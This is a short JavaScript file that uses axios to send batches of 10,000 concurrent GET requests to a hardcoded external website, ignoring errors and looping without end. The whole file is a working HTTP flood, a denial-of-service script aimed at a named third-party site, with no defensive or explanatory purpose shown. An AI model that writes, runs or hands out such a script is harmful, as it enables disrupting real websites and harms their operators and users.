import Oxios from "axios"

const axios = Oxios.create({timeout: 300})
const _ = console.log
const threshold = 10000
const site = "http://hahuyetapcao.com/"

const call = async () => {
  try{
    await axios.get(site)
  }catch(err){}
}

const loop = async () => {
  const list = new Array(threshold).fill(null)
  await Promise.all(list.map(() => call()))
  _("[re-loop] at", new Date().toString())
  await loop()
}


(async() => {
  await loop()
})()